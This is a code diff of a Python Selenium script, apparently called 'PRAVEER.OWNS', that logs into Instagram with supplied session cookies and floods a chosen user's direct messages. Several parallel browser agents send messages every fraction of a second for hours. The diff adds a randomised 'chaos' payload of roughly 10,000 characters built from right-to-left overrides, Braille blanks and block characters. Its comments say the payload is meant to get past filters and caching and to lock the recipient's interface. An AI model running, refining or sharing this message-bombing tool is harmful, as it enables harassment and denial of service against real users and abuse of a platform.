@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (4-AGENT MATRIX V18)
-# 📅 STATUS: STABLE-IMPACT | 4-AGENT TOTAL | DOCKER-READY
+# 🚀 PROJECT: PRAVEER.OWNS (CHAOS-MATRIX V19)
+# 📅 STATUS: CACHE-BYPASS | 4-AGENT TOTAL | DOCKER-READY
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,10 +13,9 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
 # --- 4 AGENTS TOTAL CONFIG ---
-# (Set to 2 here; with 2 GitHub machines, total = 4)
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.1, 0.4)
+BURST_SPEED = (0.1, 0.3)
 SESSION_LIMIT = 180       
 REST_AFTER_STRIKES = 100   
 REST_DURATION = 5          
@@ -26,14 +25,25 @@ COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 sys.stdout.reconfigure(encoding='utf-8')
 
-def get_max_heavy_payload():
-    u_id = random.randint(100, 999)
+def get_chaos_payload():
+    """Generates a randomized heavy payload to bypass layout caching."""
+    u_id = random.randint(1000, 9999)
     glue = "\u2060" 
-    iso, pop = "\u2068", "\u2069"
-    # Clean header to bypass filters, heavy body to lock UI
+    
+    # 👑 DYNAMIC HEADER
     header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 [NODE:{u_id}]"
-    body = [f"{iso}\u202E\u2800{glue}{pop}" for i in range(230)]
-    return f"{header}\n{glue.join(body)}".strip()[:9998]
+    
+    # 🏗️ THE 'CHAOS' BODY
+    # We mix different heavy characters randomly so no two messages are alike.
+    elements = ["\u2800", "█", "▓", "░", "\u2068", "\u202E"]
+    body = []
+    
+    for i in range(160):
+        # Randomize the sequence for every line
+        mix = "".join(random.choices(elements, k=8))
+        body.append(f"{mix}_𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_{mix}{glue}")
+        
+    return f"{header}\n{glue.join(body)}".strip()[:9995]
 
 def log_status(agent_id, msg):
     timestamp = datetime.datetime.now().strftime("%H:%M:%S")
@@ -51,7 +61,7 @@ def get_driver(agent_id):
         ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
         chrome_options.add_argument(f"user-agent={ua}")
         
-        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
+        temp_dir = os.path.join(tempfile.gettempdir(), f"chaos_node_{agent_id}_{int(time.time())}")
         chrome_options.add_argument(f"--user-data-dir={temp_dir}")
         driver = webdriver.Chrome(options=chrome_options)
         
@@ -64,7 +74,6 @@ def adaptive_send(driver, text):
         wait = WebDriverWait(driver, 25)
         box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
         
-        # Injecting via JS is more reliable for heavy payloads
         driver.execute_script("""
             var el = arguments[0];
             el.focus();
@@ -72,15 +81,8 @@ def adaptive_send(driver, text):
             el.dispatchEvent(new Event('input', { bubbles: true }));
         """, box, text)
         
-        time.sleep(0.5)
+        time.sleep(0.3)
         box.send_keys(Keys.ENTER)
-        
-        # Fallback click
-        try:
-            send_btn = driver.find_element(By.XPATH, "//button[text()='Send'] | //div[@role='button'][text()='Send']")
-            driver.execute_script("arguments[0].click();", send_btn)
-        except: pass
-        
         return True
     except: return False
 
@@ -94,19 +96,17 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             
-            log_status(agent_id, "📡 Syncing Socket...")
+            log_status(agent_id, "📡 Syncing Chaos-Socket...")
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
             
-            time.sleep(15) # Wait for socket stability
+            time.sleep(15) 
             
-            if adaptive_send(driver, "🚀 MATRIX NODE ONLINE"):
+            if adaptive_send(driver, "🚀 CHAOS MATRIX ONLINE"):
                 log_status(agent_id, "✅ Connection Established.")
-            else:
-                log_status(agent_id, "⚠️ Sync timeout. Retrying...")
-                continue
+            else: continue
 
             while (time.time() - global_start) < TOTAL_DURATION:
-                payload = get_max_heavy_payload()
+                payload = get_chaos_payload()
                 if adaptive_send(driver, payload):
                     strike_counter += 1
                     with COUNTER_LOCK:
@@ -114,7 +114,7 @@ def run_life_cycle(agent_id, cookie, target):
                         GLOBAL_SENT += 1
                     
                     if strike_counter % REST_AFTER_STRIKES == 0:
-                        log_status(agent_id, f"✅ Cycle Complete. Resting...")
+                        log_status(agent_id, "✅ Cycle Complete. Resting...")
                         time.sleep(REST_DURATION)
                     else:
                         log_status(agent_id, f"Delivered (Total: {GLOBAL_SENT})")
